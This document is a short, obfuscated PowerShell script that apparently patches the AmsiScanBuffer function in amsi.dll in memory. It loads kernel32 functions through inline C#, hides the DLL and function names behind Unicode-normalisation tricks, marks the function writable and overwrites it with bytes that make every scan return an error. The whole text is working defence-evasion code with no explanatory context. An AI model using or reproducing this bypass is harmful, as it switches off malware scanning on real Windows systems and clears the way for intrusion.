$U48 = @"
using System;
using System.Runtime.InteropServices;
public class U48 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr IIakUOJIk, string ucLOSKw7MVZxdl6Gd);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr pVe, UIntPtr CSydpgZrN, uint UFfvyCkNzCNd80YW0fIk, out uint DDTaULlHDn_1HtBXS);
}
"@

Add-Type $U48

$YSikMkdfj6ZYUNd = [U48]::LoadLibrary("$(('à'+'m'+'s'+'í'+'.'+'d'+'l'+'l').nOrmaLIZe([CHaR]([bYtE]0x46)+[char]([bYTe]0x6f)+[char](45+69)+[cHAR]([byTe]0x6d)+[char]([bYTe]0x44)) -replace [chaR]([bYtE]0x5c)+[CHAR](112)+[CHar]([ByTE]0x7b)+[chAR]([bYte]0x4d)+[ChaR]([bytE]0x6e)+[ChAR](125))")
$vH4ITigyVTGqw7hfMIHX = [U48]::GetProcAddress($YSikMkdfj6ZYUNd, "$(('ÃmsìSc'+'ãnBùff'+'èr').NormALIZe([chAR]([BytE]0x46)+[CHaR]([bYTe]0x6f)+[Char](114+87-87)+[chaR](109*83/83)+[ChAr]([BYtE]0x44)) -replace [cHar]([byte]0x5c)+[chaR]([ByTe]0x70)+[cHAR](86+37)+[CHaR](77*7/7)+[CHar](110)+[char]([bYTe]0x7d))")
$p = 0
[U48]::VirtualProtect($vH4ITigyVTGqw7hfMIHX, [uint32]5, 0x40, [ref]$p)
$Fqj3fFPR3B = "0xB8"
$Trls7zxvFb22IXt = "0x57"
$AJnvgqn8EEA = "0x00"
$D_49SRql_fAbx = "0x07"
$A6SevydxeRpnbfUL = "0x80"
$S9Y_b7g7IAOVji = "0xC3"
$EQGST2zxH_MiGT2pCG = [Byte[]] ($Fqj3fFPR3B,$Trls7zxvFb22IXt,$AJnvgqn8EEA,$D_49SRql_fAbx,+$A6SevydxeRpnbfUL,+$S9Y_b7g7IAOVji)
[System.Runtime.InteropServices.Marshal]::Copy($EQGST2zxH_MiGT2pCG, 0, $vH4ITigyVTGqw7hfMIHX, 6)